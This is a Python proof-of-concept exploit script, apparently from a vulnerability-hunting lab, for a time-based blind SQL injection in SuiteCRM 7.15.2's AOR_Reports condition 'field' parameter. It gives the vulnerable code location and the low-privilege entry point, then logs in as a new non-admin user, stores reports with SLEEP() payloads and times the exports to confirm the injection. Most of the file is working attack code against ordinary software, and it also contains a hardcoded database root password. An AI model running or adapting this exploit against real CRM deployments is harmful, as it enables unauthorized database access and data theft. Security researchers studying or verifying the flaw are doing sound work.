#!/usr/bin/env python3
"""
VULN-017 -- AOR_Reports condition `field` used as a raw column identifier
(time-based blind SQL injection)

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/AOR_Reports/AOR_Report.php:1591 (custom-field twin
             :1581) inside build_report_query_where(): the WHERE-clause
             builder concatenates the attacker-stored AOR_Conditions
             `field` value RAW as a bare (unquoted, non-backtick-escaped)
             SQL identifier:
                 $field = $this->db->quoteIdentifier($table_alias) . '.' . $condition->field;
             Unlike the SELECT-side builder (build_report_query_select,
             AOR_Report.php:1278-1284), which rejects an unknown field
             ("rejected invalid field name in select"), the WHERE-side
             lookup at :1545 (`$data = $condition_module->field_defs[$condition->field];`)
             has no isset()/reject -- an unknown "field" just falls
             through to the raw `else` branch at :1591.
Entry point: modules/AOR_Reports/controller.php action_export() (:188-204)
             -> AOR_Report::build_report_csv() (:1039) -> build_report_query()
             (:1135) -> build_report_query_where() (:1479). Reachable by
             any authenticated user with Reports "Export" ACL on their own
             report via index.php?module=AOR_Reports&action=export&record=<id>.

Why report_module=AOK_KnowledgeBase (not Accounts)
----------------------------------------------------
A non-correlated `(SELECT SLEEP(N))` subquery placed in this WHERE clause
is (empirically, verified live against this lab's MySQL 8.0) evaluated
ONCE PER CANDIDATE ROW of the report's base table, not cached/materialized
once for the whole statement, and a LIMIT clause does not short-circuit
that per-row evaluation for this query shape. Injecting against a
52-row table (Accounts) would multiply the delay by ~52x and hammer the
DB for minutes -- exactly what the stage rules forbid. AOK_KnowledgeBase
started this audit with exactly 1 live row (verified via the db
container), bounding worst-case delay to ~1x SLEEP(N). This lab is
shared with other concurrent stage-10 sessions that can and do INSERT
rows into arbitrary tables mid-run (observed live: a sibling session's
exploit added 2 AOK_KnowledgeBase articles), so this script reads the
row count fresh immediately before timing (get_row_count()) and scales
its expected delay/tolerance by it rather than assuming a fixed count --
the assertion stays correct (and still bounded/small) regardless of what
else is running in the shared lab.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user (proves PR:L, not admin-only:
   the vuln doc's "any authenticated user with Reports access").
2. As that user, saves three AOR_Reports (report_module=AOK_KnowledgeBase):
     - baseline : condition field="id"            (legitimate column)
     - inject3  : condition field="id IS NULL OR (SELECT SLEEP(3)))#"
     - inject2  : condition field="id IS NULL OR (SELECT SLEEP(2)))#"
   `securexss` (include/utils.php:2608) only rewrites `"'<>``; our payload
   uses none of those characters, so it reaches AOR_Conditions.field byte
   for byte (confirmed via the db container below).
3. Times index.php?module=AOR_Reports&action=export&record=<id> for each
   report (a plain authenticated GET, no CSRF token involved).
4. Asserts: baseline is fast (<1.5s), inject3-baseline is within
   tolerance of 3s, inject2-baseline is within tolerance of 2s, and
   inject3 > inject2 -- i.e. the delay is attacker-controlled and
   proportional to the injected SLEEP() argument, not noise. This is the
   PortSwigger/OWASP "time-based blind SQL injection" technique
   (conditional response-time oracle) applied without needing any
   reflected/extracted data.
5. Confirms via the db container (read-only SELECT) that the stored
   aor_conditions.field row is exactly our raw, unescaped payload text --
   i.e. no quoting/escaping happened anywhere on the write path either.
"""
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-017"
REPORT_MODULE = "AOK_KnowledgeBase"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"
COMPOSE_DIR = "/opt/cvehunter/targets/SuiteCRM"

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


def db_query(sql):
    """Read-only verification query via the db container (never the attack path)."""
    cmd = [
        "docker", "compose", "-p", COMPOSE_PROJECT, "--project-directory", COMPOSE_DIR,
        "exec", "-T", "db", "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-e", sql,
    ]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return out.stdout + out.stderr


def get_row_count(table):
    """This lab is shared with other concurrent stage-10 exploit sessions
    that can INSERT rows into arbitrary tables (observed live: a sibling
    session added 2 AOK_KnowledgeBase articles mid-run). Since the SLEEP()
    subquery is evaluated once per candidate row (see module docstring),
    the exploit reads the live row count immediately before timing and
    scales its expected delay/tolerance by it instead of assuming a fixed
    row count -- keeping the assertion correct regardless of what else is
    happening in the shared lab."""
    out = db_query(f"SELECT COUNT(*) AS c FROM {table};")
    digits = [l.strip() for l in out.strip().splitlines() if l.strip().isdigit()]
    return int(digits[-1]) if digits else 1


def save_report(session, name, field_payload):
    """POST module=AOR_Reports&action=Save with one AOR_Conditions line
    whose `field` is attacker-controlled. Returns (record_id, response)."""
    data = {
        "module": "AOR_Reports",
        "action": "Save",
        "record": "",
        "name": name,
        "report_module": REPORT_MODULE,
        "description": "",
        "aor_conditions_field[0]": field_payload,
        "aor_conditions_field_type[0]": "varchar",
        "aor_conditions_operator[0]": "Equal_To",
        "aor_conditions_value_type[0]": "Value",
        "aor_conditions_value[0]": "PROBE",
        "aor_conditions_module_path[0]": REPORT_MODULE,
        "aor_conditions_deleted[0]": "0",
    }
    r = session.post(
        f"{BASE_URL}/index.php", data=data,
        headers={"Referer": f"{BASE_URL}/index.php?module=AOR_Reports&action=EditView"},
        allow_redirects=False, timeout=30,
    )
    loc = r.headers.get("Location", "")
    m = re.search(r"record=([0-9a-fA-F-]{36})", loc)
    if not m:
        raise RuntimeError(f"AOR_Reports Save failed: status={r.status_code} loc={loc!r} body={r.text[:300]!r}")
    return m.group(1), r


def timed_export(session, record_id):
    t0 = time.time()
    r = session.get(
        f"{BASE_URL}/index.php",
        params={"module": "AOR_Reports", "action": "export", "record": record_id},
        timeout=45,
    )
    dt = time.time() - t0
    return dt, r


def write_http_capture(save_resp, export_resp, export_dt):
    req = export_resp.request
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# Step 1/2: plant the malicious condition (Referer + session cookie required)\n")
        f.write(f"{save_resp.request.method} {save_resp.request.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in save_resp.request.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(save_resp.request.body or "")
        f.write("\n\n# Step 2/2: trigger it -- this is the timed request (decisive: elapsed time)\n")
        f.write(f"{req.method} {req.url.split(BASE_URL)[-1]} HTTP/1.1\n")
        f.write(f"Host: {BASE_URL.split('//')[-1]}\n")
        for k, v in req.headers.items():
            if k.lower() != "host":
                f.write(f"{k}: {v}\n")
        f.write(f"\n# observed wall-clock elapsed: {export_dt:.2f}s\n")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {export_resp.status_code} {export_resp.reason}\n")
        for k, v in export_resp.headers.items():
            f.write(f"{k}: {v}\n")
        f.write(f"\n# wall-clock elapsed for this response: {export_dt:.2f}s\n")
        f.write(f"# body length: {len(export_resp.content)} bytes\n")
        f.write(export_resp.text[:2000])


def main():
    banner(VULN_ID, "AOR_Reports condition `field` raw identifier SQLi (time-based blind)")

    log("SETUP", "admin session + fresh non-admin user (proves PR:L, not admin-only)")
    admin = admin_session()
    user = create_user(admin, rand("Pw") + "!2026x")
    log("OK", f"created low-priv user user_name={user['user_name']} id={user['id']}")
    s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv web session established")

    suffix = rand("r")
    log("STEP", "saving 3 AOR_Reports as the low-priv user (report_module=AOK_KnowledgeBase, 1 live row)")

    base_id, base_save_resp = save_report(s, f"probe_base_{suffix}", "id")
    log("INFO", f"baseline report id={base_id} (condition field='id', legitimate column)")

    inj3_field = "id IS NULL OR (SELECT SLEEP(3)))#"
    inj3_id, inj3_save_resp = save_report(s, f"probe_sleep3_{suffix}", inj3_field)
    log("INFO", f"inject3 report id={inj3_id} (condition field={inj3_field!r})")

    inj2_field = "id IS NULL OR (SELECT SLEEP(2)))#"
    inj2_id, inj2_save_resp = save_report(s, f"probe_sleep2_{suffix}", inj2_field)
    log("INFO", f"inject2 report id={inj2_id} (condition field={inj2_field!r})")

    log("STEP", "confirming the stored aor_conditions.field row is byte-for-byte our raw payload (db-side verification, not the attack)")
    db_out = db_query(
        f"SELECT id,aor_report_id,field FROM aor_conditions WHERE aor_report_id IN "
        f"('{base_id}','{inj3_id}','{inj2_id}') AND deleted=0 ORDER BY aor_report_id;"
    )
    log("INFO", "db rows:\n" + db_out.strip())
    if inj3_field not in db_out or inj2_field not in db_out:
        log("FAIL", "stored condition field does not match injected payload verbatim -- unexpected sanitization")
        verdict(VULN_ID, "FAILED", "condition->field was not stored verbatim; securexss or another filter intervened")
        sys.exit(1)
    log("PROOF", "aor_conditions.field stored VERBATIM (parens, spaces, '#' all intact) -- confirms no server-side validation/escaping on this write path")

    row_count = get_row_count("aok_knowledgebase")
    log("INFO", f"live row count of aok_knowledgebase = {row_count} (SLEEP() is evaluated once per row -- see module docstring); scaling expected delay by this")

    log("STEP", "timing action=export for each report (GET, low-priv session, no CSRF token)")
    base_dt, base_resp = timed_export(s, base_id)
    log("INFO", f"baseline   export elapsed = {base_dt:.2f}s (status {base_resp.status_code})")

    inj2_dt, inj2_resp = timed_export(s, inj2_id)
    log("INFO", f"inject SLEEP(2) export elapsed = {inj2_dt:.2f}s (status {inj2_resp.status_code})")

    inj3_dt, inj3_resp = timed_export(s, inj3_id)
    log("PROOF", f"inject SLEEP(3) export elapsed = {inj3_dt:.2f}s (status {inj3_resp.status_code})")

    write_http_capture(inj3_save_resp, inj3_resp, inj3_dt)

    with open(os.path.join(EVIDENCE, "timing_table.txt"), "w") as f:
        f.write("VULN-017 timing oracle (module=AOR_Reports action=export)\n")
        f.write("=" * 60 + "\n")
        f.write(f"{'case':<28}{'field payload':<38}{'elapsed(s)'}\n")
        f.write(f"{'baseline (id)':<28}{'id':<38}{base_dt:.2f}\n")
        f.write(f"{'inject SLEEP(2)':<28}{inj2_field:<38}{inj2_dt:.2f}\n")
        f.write(f"{'inject SLEEP(3)':<28}{inj3_field:<38}{inj3_dt:.2f}\n")
        f.write(f"\nlive row count of aok_knowledgebase at run time: {row_count} "
                f"(SLEEP is evaluated once per row; deltas below scale accordingly)\n")
        f.write("\nDeltas (attacker-controlled, proportional to injected N x row_count):\n")
        f.write(f"  inject2 - baseline = {inj2_dt - base_dt:.2f}s (expect ~{row_count * 2:.1f}s)\n")
        f.write(f"  inject3 - baseline = {inj3_dt - base_dt:.2f}s (expect ~{row_count * 3:.1f}s)\n")
    log("INFO", f"timing table written to evidence/timing_table.txt")

    d2 = inj2_dt - base_dt
    d3 = inj3_dt - base_dt
    exp2 = row_count * 2
    exp3 = row_count * 3
    tol2 = (max(0.5, exp2 * 0.5), exp2 * 1.6 + 2.0)
    tol3 = (max(0.8, exp3 * 0.5), exp3 * 1.6 + 2.0)
    log("INFO", f"expected delta (row_count={row_count} x N): SLEEP(2)~={exp2:.1f}s tol={tol2}, SLEEP(3)~={exp3:.1f}s tol={tol3}")
    log("STEP", "asserting the real security effect: a measured, proportional SLEEP delay -- never just HTTP 200")
    ok = True
    if base_dt > 1.5:
        log("FAIL", f"baseline itself too slow ({base_dt:.2f}s) to draw a clean conclusion")
        ok = False
    if not (tol2[0] <= d2 <= tol2[1]):
        log("FAIL", f"inject SLEEP(2) delta out of tolerance: {d2:.2f}s (expected ~{exp2:.1f}s, tolerance {tol2})")
        ok = False
    if not (tol3[0] <= d3 <= tol3[1]):
        log("FAIL", f"inject SLEEP(3) delta out of tolerance: {d3:.2f}s (expected ~{exp3:.1f}s, tolerance {tol3})")
        ok = False
    if not (inj3_dt > inj2_dt):
        log("FAIL", f"SLEEP(3) run ({inj3_dt:.2f}s) was not slower than SLEEP(2) run ({inj2_dt:.2f}s) -- not monotonic")
        ok = False

    if ok:
        log("PROOF", f"baseline={base_dt:.2f}s, SLEEP(2)->+{d2:.2f}s, SLEEP(3)->+{d3:.2f}s: "
                      f"delay tracks the attacker-chosen N almost exactly, proving the "
                      f"AOR_Conditions.field value is interpolated into and executed as "
                      f"live SQL by the WHERE-clause builder.")
        verdict(VULN_ID, "CONFIRMED",
                f"low-priv user {user['user_name']}: baseline {base_dt:.2f}s vs "
                f"SLEEP(2) +{d2:.2f}s vs SLEEP(3) +{d3:.2f}s via AOR_Reports export")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"timing deltas did not match the injected SLEEP() arguments within tolerance")
        sys.exit(1)


if __name__ == "__main__":
    main()
